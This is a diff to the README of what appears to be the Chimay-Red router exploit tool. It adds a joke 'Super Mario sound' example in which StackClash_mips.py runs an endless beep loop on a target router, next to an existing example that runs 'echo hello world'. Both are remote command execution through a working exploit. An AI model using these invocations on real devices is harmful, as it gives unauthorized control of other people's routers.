@@ -62,6 +62,12 @@ $ ./StackClash_mips.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
 ```
 ![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)  
 
+### Super Mario sound
+Do not do it! ;-P
+```
+$ ./StackClash_mips.py 192.168.8.1 80 www_6384 "while [ true ]; do /nova/bin/info ':beep frequency=660 length=100ms;:delay 150ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=510 length=100ms;:delay 100ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=770 length=100ms;:delay 550ms;:beep frequency=380 length=100ms;:delay 575ms;:beep frequency=510 length=100ms;:delay 450ms;:beep frequency=380 length=100ms;:delay 400ms;:beep frequency=320 length=100ms;:delay 500ms;:beep frequency=440 length=100ms;:delay 300ms;:beep frequency=480 length=80ms;:delay 330ms;:beep frequency=450 length=100ms;:delay 150ms;:beep frequency=430 length=100ms;:delay 300ms;:beep frequency=380 length=100ms;:delay 200ms;:beep frequency=660 length=80ms;:delay 200ms;:beep frequency=760 length=50ms;:delay 150ms;:beep frequency=860 length=100ms;:delay 300ms;:beep frequency=700 length=80ms;:delay 150ms;:beep frequency=760 length=50ms;:delay 350ms;:beep frequency=660 length=80ms;:delay 300ms;:beep frequency=520 length=80ms;:delay 150ms;:beep frequency=580 length=80ms;:delay 150ms;:beep frequency=480 length=80ms;:delay 500ms;'; done"
+```
+
 ### Upload binaries
 To upload `busybox-mips` in `/ram/busybox`  
 In a shell:
